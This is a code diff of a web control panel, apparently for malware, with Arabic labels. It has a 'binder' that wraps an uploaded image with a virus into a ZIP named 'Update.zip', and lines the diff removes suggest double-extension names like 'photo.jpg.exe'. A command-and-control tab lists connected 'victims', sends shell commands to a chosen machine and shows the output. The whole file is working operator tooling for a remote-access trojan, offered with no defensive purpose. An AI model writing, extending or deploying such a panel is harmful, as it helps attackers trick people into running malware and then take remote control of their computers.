@@ -6,59 +6,26 @@
 <title>Nyx Control Panel</title>
 <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { 
-        background: #0a0a0a; color: #e8e8e8; 
-        font-family: -apple-system, system-ui, sans-serif; 
-        padding: 15px; font-size: 15px;
-    }
-    .card { 
-        background: #141414; border: 1px solid #222; 
-        padding: 15px; margin-bottom: 15px; border-radius: 12px; 
-    }
+    body { background: #0a0a0a; color: #e8e8e8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; font-size: 15px; }
+    .card { background: #141414; border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; }
     h2 { font-size: 20px; color: #4ade80; margin-bottom: 15px; text-align: center; }
     h3 { font-size: 16px; color: #e8e8e8; margin-bottom: 10px; }
     label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; margin-top: 10px; }
-    
-    input[type="text"], input[type="file"] { 
-        width: 100%; padding: 12px; background: #0a0a0a; 
-        color: white; border: 1px solid #333; border-radius: 8px; 
-        margin-bottom: 10px; font-size: 14px; outline: none;
-    }
-    input[type="file"] { padding: 8px; }
-    
-    .btn { 
-        width: 100%; background: #4a7dff; color: white; padding: 14px; 
-        border: none; border-radius: 8px; cursor: pointer; 
-        font-size: 16px; font-weight: bold; margin-bottom: 10px;
-        transition: opacity 0.2s;
-    }
+    input[type="file"] { width: 100%; padding: 12px; background: #0a0a0a; color: white; border: 1px solid #333; border-radius: 8px; margin-bottom: 10px; font-size: 14px; }
+    .btn { width: 100%; background: #4a7dff; color: white; padding: 14px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-bottom: 10px; }
     .btn:active { opacity: 0.7; }
     .btn-green { background: #4ade80; color: #000; }
-    
     .nav { display: flex; gap: 10px; margin-bottom: 15px; }
     .nav .btn { margin-bottom: 0; background: #222; }
     .nav .btn.active { background: #4a7dff; }
-    
     .hidden { display: none; }
-    
     .table-wrap { overflow-x: auto; width: 100%; margin-top: 10px; border-radius: 8px; }
     table { width: 100%; min-width: 400px; border-collapse: collapse; background: #0a0a0a; }
     th, td { padding: 12px; text-align: right; border-bottom: 1px solid #222; font-size: 13px; }
     th { color: #666; font-weight: normal; }
-    
-    pre { 
-        background: #000; padding: 12px; border-radius: 8px; 
-        color: #4ade80; font-size: 12px; white-space: pre-wrap; 
-        word-wrap: break-word; max-height: 250px; overflow-y: auto;
-        border: 1px solid #222;
-    }
-    
+    pre { background: #000; padding: 12px; border-radius: 8px; color: #4ade80; font-size: 12px; white-space: pre-wrap; max-height: 250px; overflow-y: auto; border: 1px solid #222; }
     #download-link { margin-top: 10px; text-align: center; }
-    #download-link a { 
-        display: block; padding: 12px; background: #222; 
-        color: #4ade80; border-radius: 8px; text-decoration: none; 
-        font-weight: bold; border: 1px solid #4ade80;
-    }
+    #download-link a { display: block; padding: 12px; background: #222; color: #4ade80; border-radius: 8px; text-decoration: none; font-weight: bold; border: 1px solid #4ade80; }
 </style>
 </head>
 <body>
@@ -69,27 +36,17 @@
         <button class="btn" id="nav-control" onclick="showTab('control')">الضحايا (C2)</button>
     </div>
 
-    <!-- Binder Tab -->
     <div id="binder-tab" class="card">
-        <h3>1. ارفع الفايروس (أي ملف: exe, py, bat)</h3>
-        <input type="file" id="payload-upload">
-        <button class="btn" onclick="uploadPayload()">رفع الفايروس</button>
-        <span id="payload-status" style="color:#4ade80; font-size:13px; display:block; text-align:center;"></span>
+        <h3>توليد ملف الضحية</h3>
+        <p style="font-size:12px; color:#666; margin-bottom:10px;">ارفع صورة، والسيرفر بيصنع لك ملف ZIP فيه الصورة + الفايروس جاهز لكل الأنظمة (ويندوز، ماك، لينكس).</p>
         
-        <hr style="border-color:#222; margin:20px 0;">
-
-        <h3>2. اصنع الملف الخادع (Bait)</h3>
         <label>ارفع الصورة (الغلاف):</label>
         <input type="file" id="img-upload" accept="image/*">
         
-        <label>اسم الفايروس للضحية (مثال: photo.jpg.exe):</label>
-        <input type="text" id="custom-name" placeholder="اتركه فاضي لياخذ اسم الصورة تلقائياً">
-        
-        <button class="btn btn-green" onclick="buildPayload()">توليد الملف المضغوط (ZIP)</button>
+        <button class="btn btn-green" onclick="buildPayload()">توليد ملف ZIP</button>
         <div id="download-link"></div>
     </div>
 
-    <!-- C2 Tab -->
     <div id="control-tab" class="card hidden">
         <h3>الضحايا المتصلين</h3>
         <div class="table-wrap">
@@ -101,9 +58,8 @@
         
         <div id="cmd-area" class="hidden" style="margin-top:20px; border-top: 1px solid #333; padding-top: 15px;">
             <h3>التحكم في <span id="active-id" style="color:#4ade80;"></span></h3>
-            <input type="text" id="cmd-input" placeholder="اكتب أمر CMD (مثال: dir, whoami)">
+            <input type="text" id="cmd-input" placeholder="اكتب أمر CMD" style="width:100%; padding:12px; background:#0a0a0a; color:white; border:1px solid #333; border-radius:8px; margin-bottom:10px;">
             <button class="btn" onclick="sendCmd()">إرسال الأمر</button>
-            
             <h3 style="margin-top:15px;">النتيجة:</h3>
             <pre id="output">في انتظار النتيجة...</pre>
         </div>
@@ -111,73 +67,40 @@
 
     <script>
         function showTab(tab) {
-            if (tab === 'binder') {
-                document.getElementById('binder-tab').classList.remove('hidden');
-                document.getElementById('control-tab').classList.add('hidden');
-                document.getElementById('nav-binder').classList.add('active');
-                document.getElementById('nav-control').classList.remove('active');
-            } else {
-                document.getElementById('binder-tab').classList.add('hidden');
-                document.getElementById('control-tab').classList.remove('hidden');
-                document.getElementById('nav-binder').classList.remove('active');
-                document.getElementById('nav-control').classList.add('active');
-            }
-        }
-
-        // --- Binder Logic ---
-        async function uploadPayload() {
-            const fileInput = document.getElementById('payload-upload');
-            if (!fileInput.files.length) return alert("اختر ملف أولاً");
-            const formData = new FormData();
-            formData.append("file", fileInput.files[0]);
-            
-            const statusEl = document.getElementById('payload-status');
-            statusEl.innerText = "جاري الرفع...";
-            
-            try {
-                const res = await fetch('/upload_payload', { method: 'POST', body: formData });
-                const data = await res.json();
-                if (data.ok) statusEl.innerText = "تم رفع الفايروس بنجاح ✅";
-                else alert("فشل الرفع");
-            } catch (e) {
-                statusEl.innerText = "خطأ في الاتصال";
-            }
+            document.getElementById('binder-tab').classList.toggle('hidden', tab !== 'binder');
+            document.getElementById('control-tab').classList.toggle('hidden', tab !== 'control');
+            document.getElementById('nav-binder').classList.toggle('active', tab === 'binder');
+            document.getElementById('nav-control').classList.toggle('active', tab === 'control');
         }
 
         async function buildPayload() {
             const fileInput = document.getElementById('img-upload');
-            if (!fileInput.files.length) return alert("اختر صورة أولاً");
+            if (!fileInput.files.length) return alert("ارفع صورة أولاً");
             const formData = new FormData();
             formData.append("image", fileInput.files[0]);
-            formData.append("custom_name", document.getElementById('custom-name').value);
             
             document.getElementById('download-link').innerHTML = "جاري التجهيز...";
             
             try {
                 const res = await fetch('/build', { method: 'POST', body: formData });
-                
                 if (res.ok) {
                     const blob = await res.blob();
                     const url = window.URL.createObjectURL(blob);
                     document.getElementById('download-link').innerHTML = `<a href="${url}" download="Update.zip">⬇️ تحميل الملف (Update.zip)</a>`;
                 } else {
-                    alert("حدث خطأ، تأكد من رفع الفايروس أولاً");
+                    alert("حدث خطأ");
                     document.getElementById('download-link').innerHTML = "";
                 }
-            } catch (e) {
-                alert("فشل الاتصال بالسيرفر");
-            }
+            } catch (e) { alert("فشل الاتصال"); }
         }
 
-        // --- C2 Logic ---
         let activeId = null;
-        
         function loadClients() {
             fetch('/api/clients').then(r => r.json()).then(data => {
                 const tbody = document.querySelector('#clients-table tbody');
                 tbody.innerHTML = '';
                 if(Object.keys(data).length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#666;">لا يوجد ضحايا متصلين حالياً</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:#666;">لا يوجد ضحايا</td></tr>';
                     return;
                 }
                 for (const [id, info] of Object.entries(data)) {
@@ -193,30 +116,26 @@
             activeId = id;
             document.getElementById('active-id').innerText = id.substring(0,6);
             document.getElementById('cmd-area').classList.remove('hidden');
-            document.getElementById('output').innerText = 'في انتظار النتيجة...';
+            document.getElementById('output').innerText = 'في انتظار...';
             getResult();
         }
         
         function sendCmd() {
             const cmd = document.getElementById('cmd-input').value;
             if(!cmd || !activeId) return;
-            
             fetch('/api/send_cmd/' + activeId, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                method: 'POST', headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({cmd: cmd})
             }).then(() => {
                 document.getElementById('cmd-input').value = '';
-                document.getElementById('output').innerText = 'تم إرسال الأمر، بانتظار الرد...';
+                document.getElementById('output').innerText = 'تم الإرسال...';
             });
         }
         
         function getResult() {
             if(!activeId) return;
             fetch('/api/get_result/' + activeId).then(r => r.json()).then(data => {
-                if(data.result) {
-                    document.getElementById('output').innerText = data.result;
-                }
+                if(data.result) document.getElementById('output').innerText = data.result;
             }).catch(() => {});
             setTimeout(getResult, 2000);
         }
